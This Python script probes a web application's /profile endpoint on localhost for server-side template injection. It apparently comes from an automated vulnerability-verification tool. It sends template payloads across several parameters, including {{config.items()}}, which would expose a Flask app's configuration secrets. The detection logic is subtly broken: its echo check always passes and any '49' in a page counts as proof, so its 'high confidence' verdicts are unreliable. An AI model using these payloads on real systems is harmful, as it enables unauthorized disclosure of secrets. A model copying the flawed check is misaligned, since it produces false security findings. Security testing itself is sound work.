#!/usr/bin/env python3
import requests
import json
import sys
import re
from urllib.parse import urljoin

def exploit():
    # Target configuration
    base_url = "http://localhost:3000"
    vuln_id = "profile-template-injection"
    
    # Initialize result structure
    result = {
        "vulnerability_id": vuln_id,
        "target_url": base_url,
        "vulnerable": False,
        "confidence": "low",
        "evidence": [],
        "error": None,
        "test_results": []
    }
    
    try:
        # Test payloads for different template engines
        test_cases = [
            {
                "name": "Jinja2/Flask Math Expression",
                "payload": "{{7*7}}",
                "expected": "49",
                "engine": "Jinja2"
            },
            {
                "name": "Jinja2/Flask Config Access",
                "payload": "{{config}}",
                "expected": "Config",
                "engine": "Jinja2"
            },
            {
                "name": "Twig Math Expression", 
                "payload": "{{7*7}}",
                "expected": "49",
                "engine": "Twig"
            },
            {
                "name": "Smarty Math Expression",
                "payload": "{7*7}",
                "expected": "49", 
                "engine": "Smarty"
            },
            {
                "name": "Handlebars Basic",
                "payload": "{{7*7}}",
                "expected": "49",
                "engine": "Handlebars"
            },
            {
                "name": "ERB Ruby Expression",
                "payload": "<%= 7*7 %>",
                "expected": "49",
                "engine": "ERB"
            }
        ]
        
        # Test different injection points on profile endpoint
        injection_points = [
            {"param": "bio", "method": "GET"},
            {"param": "username", "method": "GET"},
            {"param": "bio", "method": "POST"},
            {"param": "username", "method": "POST"},
            {"param": "name", "method": "GET"},
            {"param": "description", "method": "GET"}
        ]
        
        session = requests.Session()
        session.timeout = 10
        
        # Test each combination of payload and injection point
        for test_case in test_cases:
            for injection_point in injection_points:
                try:
                    # Construct the profile URL
                    profile_url = urljoin(base_url, "/profile")
                    
                    test_result = {
                        "test_name": f"{test_case['name']} via {injection_point['param']} ({injection_point['method']})",
                        "payload": test_case['payload'],
                        "injection_point": injection_point['param'],
                        "method": injection_point['method'],
                        "vulnerable": False,
                        "response_snippet": "",
                        "status_code": None
                    }
                    
                    # Prepare request data
                    if injection_point['method'] == 'GET':
                        params = {injection_point['param']: test_case['payload']}
                        response = session.get(profile_url, params=params)
                    else:  # POST
                        data = {injection_point['param']: test_case['payload']}
                        response = session.post(profile_url, data=data)
                    
                    test_result['status_code'] = response.status_code
                    
                    # Skip if request failed
                    if response.status_code >= 500:
                        test_result['response_snippet'] = "Server error"
                        result['test_results'].append(test_result)
                        continue
                    
                    response_text = response.text
                    test_result['response_snippet'] = response_text[:200] + "..." if len(response_text) > 200 else response_text
                    
                    # Check if payload was executed (template injection occurred)
                    if test_case['expected'] in response_text:
                        # Verify it's not just echoing the payload
                        if test_case['payload'] not in response_text or test_case['expected'] != test_case['payload']:
                            test_result['vulnerable'] = True
                            result['vulnerable'] = True
                            result['confidence'] = "high"
                            
                            evidence = {
                                "injection_point": injection_point['param'],
                                "method": injection_point['method'],
                                "payload": test_case['payload'],
                                "expected_result": test_case['expected'],
                                "template_engine": test_case['engine'],
                                "response_contains": test_case['expected']
                            }
                            result['evidence'].append(evidence)
                    
                    # Check for other template injection indicators
                    error_indicators = [
                        "TemplateError", "TemplateSyntaxError", "UndefinedError",
                        "jinja2.exceptions", "Template parse error", "smarty error",
                        "Twig_Error", "Handlebars: Access has been denied"
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response_text.lower():
                            result['vulnerable'] = True
                            result['confidence'] = "medium" if result['confidence'] == "low" else result['confidence']
                            
                            evidence = {
                                "injection_point": injection_point['param'],
                                "method": injection_point['method'],
                                "payload": test_case['payload'],
                                "template_engine": "Unknown",
                                "error_indicator": indicator,
                                "evidence_type": "error_disclosure"
                            }
                            result['evidence'].append(evidence)
                            test_result['vulnerable'] = True
                            break
                    
                    result['test_results'].append(test_result)
                    
                except requests.RequestException as e:
                    test_result['response_snippet'] = f"Request failed: {str(e)}"
                    result['test_results'].append(test_result)
                    continue
        
        # Also test the original hypothesis payload
        try:
            original_url = urljoin(base_url, "/profile")
            params = {"bio": "{{7*7}}", "username": "{{config.items()}}"}
            response = session.get(original_url, params=params)
            
            original_test = {
                "test_name": "Original Hypothesis Test",
                "payload": "bio={{7*7}}&username={{config.items()}}",
                "injection_point": "multiple",
                "method": "GET",
                "vulnerable": False,
                "response_snippet": response.text[:200] + "..." if len(response.text) > 200 else response.text,
                "status_code": response.status_code
            }
            
            if "49" in response.text or "Config" in response.text:
                original_test['vulnerable'] = True
                result['vulnerable'] = True
                result['confidence'] = "high"
                
                evidence = {
                    "injection_point": "bio and username parameters",
                    "method": "GET",
                    "payload": "{{7*7}} and {{config.items()}}",
                    "template_engine": "Jinja2/Flask",
                    "evidence_type": "code_execution"
                }
                result['evidence'].append(evidence)
            
            result['test_results'].append(original_test)
            
        except requests.RequestException as e:
            result['error'] = f"Failed to test original hypothesis: {str(e)}"
    
    except Exception as e:
        result['error'] = f"Exploit execution failed: {str(e)}"
    
    return result

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))